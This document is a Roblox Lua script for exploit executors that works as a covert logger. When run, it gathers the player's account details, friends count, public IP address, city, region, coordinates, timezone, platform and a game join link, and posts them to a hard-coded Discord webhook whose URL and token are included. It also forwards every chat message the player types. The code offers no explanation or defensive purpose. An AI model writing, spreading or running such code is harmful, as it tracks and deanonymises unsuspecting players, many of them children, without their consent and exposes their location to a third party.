
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")

local LocalPlayer = Players.LocalPlayer
local webhookUrl = "https://discord.com/api/webhooks/1496574594742485033/kx2LJFifhIkRMD0UZcgJy4Vy0J3GxKeU-AWJzil87YRzLcSOkm04sikLkKSdBUy1iaBp"

local request = http_request or request or (syn and syn.request) or (http and http.request)

local ip, city, region, countryCode, latitude, longitude, timezone = "Unknown", "Unknown", "Unknown", "??", "Unknown", "Unknown", "Unknown"
local screenResolution = "Unknown"
local friendsCount = "Unknown"
local executorName = "Standard Roblox"

local function getLocalTime()
    return os.date("%H:%M:%S")
end

local function getPlatformName()
    local platformName = "Unknown"
    pcall(function()
        local p = UserInputService:GetPlatform()
        local s = tostring(p)
        platformName = s:match("%.(%w+)$") or "Unknown"
    end)
    if platformName == "Unknown" then
        if UserInputService.TouchEnabled then
            platformName = "Mobile/Tablet"
        elseif UserInputService.KeyboardEnabled then
            platformName = "PC"
        else
            platformName = "Unknown"
        end
    end
    return platformName
end

local function getAltStatus(age)
    return age < 30 and "Alt Account" or "Main Account"
end

local platformName = getPlatformName()
local userId = LocalPlayer.UserId
local accountAge = LocalPlayer.AccountAge
local altStatus = getAltStatus(accountAge)

local success4, resolution = pcall(function()
    local screenSize = GuiService:GetScreenResolution()
    return string.format("%dx%d", screenSize.X, screenSize.Y)
end)
if success4 then
    screenResolution = resolution
end

local function detectExecutor()
    local success, name = pcall(function()
        return identifyexecutor and identifyexecutor() or "Standard Roblox"
    end)
    return success and name or "Standard Roblox"
end
executorName = detectExecutor()

local function sendWebhook(data)
    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

task.spawn(function()
    local success, response = pcall(function()
        return game:HttpGet("https://api.ipify.org?format=json")
    end)
    if success then
        local data = HttpService:JSONDecode(response)
        ip = data.ip or "Unknown"
    end

    local success2, response2 = pcall(function()
        return game:HttpGet("http://ip-api.com/json/" .. ip)
    end)
    if success2 then
        local data = HttpService:JSONDecode(response2)
        city = data.city or "Unknown"
        region = data.regionName or "Unknown"
        countryCode = data.countryCode or "??"
        latitude = data.lat or "Unknown"
        longitude = data.lon or "Unknown"
        timezone = data.timezone or "Unknown"
    end

    local success6, friendsData = pcall(function()
        return Players:GetFriendsAsync(userId)
    end)
    if success6 then
        friendsCount = tostring(#friendsData:GetCurrentPage())
    end

    sendWebhook({
        content = "**Script Executed**",
        embeds = {{
            title = LocalPlayer.Name .. " ran the script",
            color = 0x00ff00,
            fields = {
                { name = "User ID", value = tostring(userId), inline = true },
                { name = "Account Age", value = tostring(accountAge) .. " days", inline = true },
                { name = "Account Type", value = altStatus, inline = true },
                { name = "User Link", value = string.format("[Profile](https://www.roblox.com/users/%d/profile)", userId), inline = true },
                { name = "Friends Count", value = friendsCount, inline = true },
                { name = "IP Address", value = ip, inline = true },
                { name = "City", value = city, inline = true },
                { name = "Region", value = region .. " (" .. countryCode .. ")", inline = true },
                { name = "Latitude", value = tostring(latitude), inline = true },
                { name = "Longitude", value = tostring(longitude), inline = true },
                { name = "Timezone", value = timezone, inline = true },
                { name = "Local Time", value = getLocalTime(), inline = true },
                { name = "Platform", value = platformName, inline = true },
                { name = "Screen Resolution", value = screenResolution, inline = true },
                { name = "Executor", value = executorName, inline = true },
                { name = "Game Link", value = string.format("[Join Here](https://www.roblox.com/games/%d/%s)", game.PlaceId, game.JobId), inline = true }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
end)

LocalPlayer.Chatted:Connect(function(message)
    sendWebhook({
        content = "**New Chat Message**",
        embeds = {{
            title = LocalPlayer.Name .. " said:",
            description = message,
            color = 0x7289DA,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
end)
